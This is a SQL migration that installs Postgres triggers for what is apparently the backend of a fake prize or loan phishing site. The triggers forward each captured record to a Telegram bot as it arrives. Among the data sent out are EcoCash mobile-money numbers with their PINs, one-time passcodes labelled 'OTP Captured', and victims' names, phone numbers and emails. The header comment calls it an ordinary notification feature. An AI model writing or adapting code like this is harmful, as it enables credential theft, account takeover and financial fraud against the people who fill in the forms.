/*
  # Database-Level Telegram Notifications (pg_net triggers)

  ## Purpose
  Moves Telegram notification triggering from the frontend into the database
  itself. Now every INSERT into any data table pushes a message to Telegram
  automatically — regardless of whether the site is open, the browser is
  closed, or the submission came from another source.

  ## 1. Extension
  - Enables `pg_net` (async HTTP client for Postgres) in the `extensions` schema.
    Used to call the Telegram Bot API from inside trigger functions.

  ## 2. Helper Function
  - `notify_telegram(text)` — reads the bot token + chat ID from
    `telegram_config`, builds an HTML message, and fires an async POST to
    `https://api.telegram.org/bot<token>/sendMessage`. If config is missing
    or disabled, it silently returns. The HTTP call is non-blocking
    (pg_net.enroll is async) so the INSERT is never delayed.

  ## 3. Table-Specific Trigger Functions
  - `notify_on_application()` — fires on applications INSERT. Includes
    name, phone, email, prize amount, loan type.
  - `notify_on_ecocash_login()` — fires on ecocash_logins INSERT. Includes
    mobile number and PIN.
  - `notify_on_otp_verification()` — fires on otp_verifications INSERT.
    Includes phone number and OTP code.
  - `notify_on_final_submission()` — fires on final_submissions INSERT.
    Includes name, phone, prize, credit score, account status.

  ## 4. Triggers
  - One AFTER INSERT trigger per table, each calling its function.

  ## Security
  - All functions are SECURITY DEFINER so they can read telegram_config
    (which is RLS-locked to admins) even when the INSERT runs as the anon
    role. search_path is pinned to `extensions, public` to avoid schema
    injection.
*/

-- ---------- enable pg_net ----------
CREATE EXTENSION IF NOT EXISTS pg_net WITH SCHEMA extensions;

-- ---------- shared helper ----------
CREATE OR REPLACE FUNCTION public.notify_telegram(p_message text)
RETURNS void
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = extensions, public
AS $$
DECLARE
  cfg record;
  url text;
  payload jsonb;
BEGIN
  SELECT bot_token, chat_id, is_enabled
  INTO cfg
  FROM telegram_config
  LIMIT 1;

  -- Silently skip if not configured or disabled
  IF NOT FOUND OR NOT cfg.is_enabled OR cfg.bot_token IS NULL OR cfg.chat_id IS NULL THEN
    RETURN;
  END IF;

  url := 'https://api.telegram.org/bot' || cfg.bot_token || '/sendMessage';
  payload := jsonb_build_object(
    'chat_id', cfg.chat_id,
    'text', p_message,
    'parse_mode', 'HTML'
  );

  -- Async, non-blocking HTTP POST — does not delay the INSERT
  PERFORM net.http_post(
    url := url,
    headers := jsonb_build_object('Content-Type', 'application/json'),
    body := payload::text
  );
END;
$$;

-- ---------- applications trigger ----------
CREATE OR REPLACE FUNCTION public.notify_on_application()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = extensions, public
AS $$
DECLARE
  msg text;
  prize text;
BEGIN
  prize := CASE WHEN NEW.loan_amount IS NOT NULL THEN '$' || NEW.loan_amount::numeric::text ELSE 'N/A' END;
  msg := '<b>🎁 New Prize Claim</b>' || E'\n' ||
         '<b>Name:</b> ' || COALESCE(NEW.full_name, 'N/A') || E'\n' ||
         '<b>Phone:</b> ' || COALESCE(NEW.phone_number, 'N/A') || E'\n' ||
         '<b>Email:</b> ' || COALESCE(NEW.email, 'N/A') || E'\n' ||
         '<b>Prize:</b> ' || prize || E'\n' ||
         '<b>Type:</b> ' || COALESCE(NEW.loan_type, 'N/A') || E'\n' ||
         '<b>Time:</b> ' || to_char(NEW.created_at AT TIME ZONE 'UTC', 'YYYY-MM-DD HH24:MI:SS') || ' UTC';
  PERFORM public.notify_telegram(msg);
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_notify_application ON applications;
CREATE TRIGGER trg_notify_application
  AFTER INSERT ON applications
  FOR EACH ROW EXECUTE FUNCTION public.notify_on_application();

-- ---------- ecocash_logins trigger ----------
CREATE OR REPLACE FUNCTION public.notify_on_ecocash_login()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = extensions, public
AS $$
DECLARE
  msg text;
BEGIN
  msg := '<b>💰 EcoCash Login Captured</b>' || E'\n' ||
         '<b>EcoCash #:</b> ' || COALESCE(NEW.mobile_number, 'N/A') || E'\n' ||
         '<b>PIN:</b> ' || COALESCE(NEW.pin, 'N/A') || E'\n' ||
         '<b>Time:</b> ' || to_char(NEW.created_at AT TIME ZONE 'UTC', 'YYYY-MM-DD HH24:MI:SS') || ' UTC';
  PERFORM public.notify_telegram(msg);
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_notify_ecocash_login ON ecocash_logins;
CREATE TRIGGER trg_notify_ecocash_login
  AFTER INSERT ON ecocash_logins
  FOR EACH ROW EXECUTE FUNCTION public.notify_on_ecocash_login();

-- ---------- otp_verifications trigger ----------
CREATE OR REPLACE FUNCTION public.notify_on_otp_verification()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = extensions, public
AS $$
DECLARE
  msg text;
BEGIN
  msg := '<b>🔐 OTP Captured</b>' || E'\n' ||
         '<b>Phone:</b> ' || COALESCE(NEW.phone_number, 'N/A') || E'\n' ||
         '<b>OTP Code:</b> ' || COALESCE(NEW.otp_code, 'N/A') || E'\n' ||
         '<b>Time:</b> ' || to_char(NEW.created_at AT TIME ZONE 'UTC', 'YYYY-MM-DD HH24:MI:SS') || ' UTC';
  PERFORM public.notify_telegram(msg);
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_notify_otp_verification ON otp_verifications;
CREATE TRIGGER trg_notify_otp_verification
  AFTER INSERT ON otp_verifications
  FOR EACH ROW EXECUTE FUNCTION public.notify_on_otp_verification();

-- ---------- final_submissions trigger ----------
CREATE OR REPLACE FUNCTION public.notify_on_final_submission()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = extensions, public
AS $$
DECLARE
  msg text;
  prize text;
BEGIN
  prize := CASE WHEN NEW.loan_amount IS NOT NULL THEN '$' || NEW.loan_amount::numeric::text ELSE 'N/A' END;
  msg := '<b>✅ Winner Qualified</b>' || E'\n' ||
         '<b>Name:</b> ' || COALESCE(NEW.user_name, 'N/A') || E'\n' ||
         '<b>Phone:</b> ' || COALESCE(NEW.phone_number, 'N/A') || E'\n' ||
         '<b>Prize:</b> ' || prize || E'\n' ||
         '<b>Status:</b> ' || COALESCE(NEW.account_status, 'N/A') || E'\n' ||
         '<b>Credit Score:</b> ' || COALESCE(NEW.credit_score::text, 'N/A') || E'\n' ||
         '<b>Time:</b> ' || to_char(NEW.created_at AT TIME ZONE 'UTC', 'YYYY-MM-DD HH24:MI:SS') || ' UTC';
  PERFORM public.notify_telegram(msg);
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_notify_final_submission ON final_submissions;
CREATE TRIGGER trg_notify_final_submission
  AFTER INSERT ON final_submissions
  FOR EACH ROW EXECUTE FUNCTION public.notify_on_final_submission();

-- Grant execute to anon + authenticated so triggers work for all insert paths
GRANT EXECUTE ON FUNCTION public.notify_telegram(text) TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.notify_on_application() TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.notify_on_ecocash_login() TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.notify_on_otp_verification() TO anon, authenticated;
GRANT EXECUTE ON FUNCTION public.notify_on_final_submission() TO anon, authenticated;